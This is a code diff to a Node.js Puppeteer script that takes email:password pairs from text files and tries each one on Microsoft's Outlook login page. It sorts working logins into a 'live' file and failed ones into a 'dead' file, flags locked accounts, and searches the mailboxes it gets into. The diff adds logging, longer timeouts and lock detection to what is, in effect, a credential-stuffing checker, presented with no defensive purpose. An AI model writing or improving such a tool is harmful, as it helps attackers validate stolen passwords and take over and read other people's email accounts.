@@ -8,8 +8,15 @@ const LOGIN_URL = "https://login.live.com/login.srf?..."; // Your login URL
 const MAILBOX_URL = "https://outlook.live.com/owa/..."; // Your mailbox URL
 
 const stats = { total: 0, checked: 0, live: 0, dead: 0 };
+const debug = true;
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+const log = (message, color = 'blue') => {
+    if (debug) {
+        const timestamp = new Date().toLocaleString();
+        console.log(chalk[color](`[${timestamp}] ${message}`));
+    }
+};
 
 async function ensureFolderExists(folderPath) {
     try {
@@ -41,11 +48,11 @@ async function askToProceedWithoutFilters() {
 async function waitForNavigation(page, options = {}) {
     try {
         await Promise.race([
-            page.waitForNavigation({ waitUntil: "networkidle0", timeout: 3000, ...options }),
-            new Promise(resolve => setTimeout(resolve, 3000))
+            page.waitForNavigation({ waitUntil: "networkidle0", timeout: 30000, ...options }),
+            new Promise(resolve => setTimeout(resolve, 30000))
         ]);
     } catch (error) {
-        console.log(chalk.yellow("Navigation timeout or error occurred. Continuing..."));
+        log("Navigation timeout or error occurred. Continuing...", "yellow");
     }
 }
 
@@ -54,9 +61,9 @@ async function checkEmailWithPuppeteer(email, password, filters, liveWriter, dea
     try {
         browser = await puppeteer.launch({ headless: false });
         const page = await browser.newPage();
-        await page.setDefaultNavigationTimeout(5000);
+        await page.setDefaultNavigationTimeout(60000);
 
-        console.log(chalk.blue(`Attempting login for: ${email}`));
+        log(`Attempting login for: ${email}`, 'blue');
 
         await page.goto(LOGIN_URL, { waitUntil: "networkidle0" });
         await page.type("#i0116", email);
@@ -71,7 +78,7 @@ async function checkEmailWithPuppeteer(email, password, filters, liveWriter, dea
                 EMAIL_ERROR_SELECTOR,
                 (el) => el.textContent
             );
-            console.log(chalk.red(`❌ Email error: ${errorMsg}`));
+            log(`❌ Email error: ${errorMsg}`, "red");
             deadWriter.write(`${email}:${password} | Email Error: ${errorMsg}\n`);
             return;
         } catch (e) {
@@ -82,7 +89,7 @@ async function checkEmailWithPuppeteer(email, password, filters, liveWriter, dea
         try {
             await page.waitForSelector(passwordSelector, { timeout: 1000 });
         } catch {
-            console.log(chalk.red(`Password field not found for ${email}`));
+            log(`Password field not found for ${email}`, "red");
             deadWriter.write(`${email}:${password} | Error: Password field not found\n`);
             return;
         }
@@ -95,25 +102,38 @@ async function checkEmailWithPuppeteer(email, password, filters, liveWriter, dea
 
 
         const PASSWORD_ERROR_SELECTOR = "#i0118Error";
-        try {
-            await page.waitForSelector(PASSWORD_ERROR_SELECTOR, { timeout: 1000 });
-            const errorMsg = await page.$eval(
-                PASSWORD_ERROR_SELECTOR,
-                (el) => el.textContent
-            );
-            console.log(chalk.red(`❌ Password error: ${errorMsg}`));
-            deadWriter.write(`${email}:${password} | Password Error: ${errorMsg}\n`);
-            return;
-        } catch (e) {
-            // No password error, proceed
-        }
+        const ACCOUNT_LOCKED = "#idTD_Error";
 
-        const currentUrl = page.url();
-        console.log(currentUrl)
-        if (currentUrl.includes("/signin") || currentUrl.includes("recover?") || currentUrl.includes("Abuse?") || currentUrl.includes("cancel?")) {
-            console.log(chalk.red(`Login failed for ${email}`));
-            deadWriter.write(`${email}:${password} | Error: Login failed\n`);
-            return;
+        try {
+            const currentUrl = page.url();
+            // console.log(currentUrl)
+            if (currentUrl.includes("/signin") || currentUrl.includes("recover?") || currentUrl.includes("Abuse?") || currentUrl.includes("cancel?")) {
+                log(`Login failed for ${email}`, "red");
+                deadWriter.write(`${email}:${password} | Error: Login failed\n`);
+                return;
+            }
+
+            await page.waitForSelector(PASSWORD_ERROR_SELECTOR, { timeout: 2000 }).catch(() => null);
+            await page.waitForSelector(ACCOUNT_LOCKED, { timeout: 2000 }).catch(() => null);
+
+            let passwordErrorMsg = await page.$(PASSWORD_ERROR_SELECTOR);
+            if (passwordErrorMsg) {
+                let errorMsg = await page.$eval(PASSWORD_ERROR_SELECTOR, (el) => el.textContent);
+                log(`❌ Password error: ${errorMsg}`, "red");
+                deadWriter.write(`${email}:${password} | Password Error: ${errorMsg}\n`);
+                return;
+            }
+
+            let accountLockedMsg = await page.$(ACCOUNT_LOCKED);
+            if (accountLockedMsg) {
+                let errorMsg = await page.$eval(ACCOUNT_LOCKED, (el) => el.textContent);
+                log(`❌ Account locked error: ${errorMsg}`, "red");
+                deadWriter.write(`${email}:${password} | Account Locked: ${errorMsg}\n`);
+                return;
+            }
+
+        } catch (e) {
+            // No error found, proceed
         }
 
         // Handle "Stay signed in?" prompt if it appears
@@ -126,7 +146,7 @@ async function checkEmailWithPuppeteer(email, password, filters, liveWriter, dea
         } catch {
         }
 
-        console.log(chalk.green(`Login successful for ${email}`));
+        log(`Login successful for ${email}`, "green");
 
         // Perform email search and filtering here if needed
         await page.goto(MAILBOX_URL, { waitUntil: "networkidle0" });
@@ -145,9 +165,9 @@ async function checkEmailWithPuppeteer(email, password, filters, liveWriter, dea
         try {
             await page.waitForSelector('.jGG6V.gDC9O', { timeout: 5000 });
             const results = await page.$$eval('.jGG6V.gDC9O', elements => elements.length);
-            console.log(`Found ${results} result(s).`);
+            log(`Found ${results} result(s).`);
         } catch (e) {
-            console.log('No search results found or search timed out.');
+            log('No search results found or search timed out.');
         }
 
 
@@ -155,7 +175,7 @@ async function checkEmailWithPuppeteer(email, password, filters, liveWriter, dea
         liveWriter.write(`${email}:${password}\n`);
 
     } catch (error) {
-        console.error(chalk.red(`Error for ${email}:`, error.message));
+        log(`Error for ${email}:`, error.message, "red");
         deadWriter.write(`${email}:${password} | Error: ${error.message}\n`);
         stats.dead++;
     } finally {
@@ -193,7 +213,7 @@ async function main() {
     const filters = await readFilters(path.join(__dirname, "filter.txt"));
 
     if (!filters && !(await askToProceedWithoutFilters())) {
-        console.log(chalk.red("Process aborted due to missing or empty filter.txt."));
+        log("Process aborted due to missing or empty filter.txt.", "red");
         return;
     }
 
@@ -202,7 +222,7 @@ async function main() {
     const txtFiles = inputFiles.filter(file => file.endsWith(".txt"));
 
     if (txtFiles.length === 0) {
-        console.error(chalk.red("No .txt files found in the input folder."));
+        log("No .txt files found in the input folder.", "red");
         process.exit(1);
     }
 
@@ -210,8 +230,8 @@ async function main() {
         await processFile(path.join(inputFolder, inputFile), filters);
     }
 
-    console.log(chalk.blue("\nAuthentication process completed."));
-    console.log(chalk.cyan(`Total: ${stats.total}, Checked: ${stats.checked}, Live: ${stats.live}, Dead: ${stats.dead}`));
+    log("\nAuthentication process completed.", "blue");
+    log(`Total: ${stats.total}, Checked: ${stats.checked}, Live: ${stats.live}, Dead: ${stats.dead}`, "cyan");
 }
 
 main().catch(console.error);
